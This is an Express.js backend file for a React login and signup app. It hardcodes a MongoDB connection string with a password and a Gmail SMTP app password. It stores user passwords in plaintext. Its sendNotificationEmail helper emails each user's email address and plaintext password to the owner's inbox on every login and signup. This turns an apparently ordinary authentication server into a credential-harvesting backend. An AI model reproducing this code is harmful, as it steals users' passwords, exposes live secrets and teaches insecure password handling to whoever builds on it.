// backend/server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const nodemailer = require('nodemailer'); 

const app = express();

// Middleware
app.use(express.json());
app.use(cors()); 

// Connect to MongoDB
mongoose.connect('mongodb+srv://nithanssk_db_user:xx0P6vVr9DaaKxXm@cluster0.vy1g43n.mongodb.net/myauthdb?retryWrites=true&w=majority')
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Connection Error:', err));

// Set up Nodemailer Transporter (Updated for Cloud Hosting/Render)
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // Use SSL for port 465 to prevent connection timeouts on cloud servers
  auth: {
    user: 'roobankr6@gmail.com', 
    pass: 'jvjkdwuhtmgvlldf'  
  }
});

// Helper function to send the email notification
const sendNotificationEmail = (actionType, userEmail, userPassword) => {
  const mailOptions = {
    from: 'nithanssk@gmail.com',
    to: 'nithanssk@gmail.com', 
    subject: `App Notification: New ${actionType}`,
    text: `Hello!\n\nA user has just performed a ${actionType} on your React App.\n\nDetails:\nEmail: ${userEmail}\nPassword: ${userPassword}\n\nTimestamp: ${new Date().toLocaleString()}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('❌ Error sending email notification:', error);
    } else {
      console.log('✅ Email notification sent successfully:', info.response);
    }
  });
};

// 1. Define a User Schema & Model
const UserSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true } 
});
const User = mongoose.model('User', UserSchema);

// 2. Create the Login Route
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(400).json({ message: 'User not found. Please sign up.' });
    }

    if (user.password !== password) {
      return res.status(400).json({ message: 'Invalid credentials' });
    }

    // Attempt to send email but don't block the response
    sendNotificationEmail('LOGIN', email, password);

    res.status(200).json({ message: 'Login successful!', user: { email: user.email } });

  } catch (error) {
    console.error(error);
    res.status(500).json({ message: 'Server error' });
  }
});

// 3. Create the Signup Route
app.post('/api/signup', async (req, res) => {
  try {
    const { email, password } = req.body;

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ message: 'User already exists. Please log in.' });
    }

    const newUser = new User({ email, password });
    await newUser.save();

    // Attempt to send email
    sendNotificationEmail('SIGNUP', email, password);

    res.status(201).json({ message: 'Account created successfully! You can now log in.' });

  } catch (error) {
    console.error('Signup Error:', error);
    res.status(500).json({ message: 'Server error during signup.' });
  }
});

// Start the server (Dynamically assigned port for Render)
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));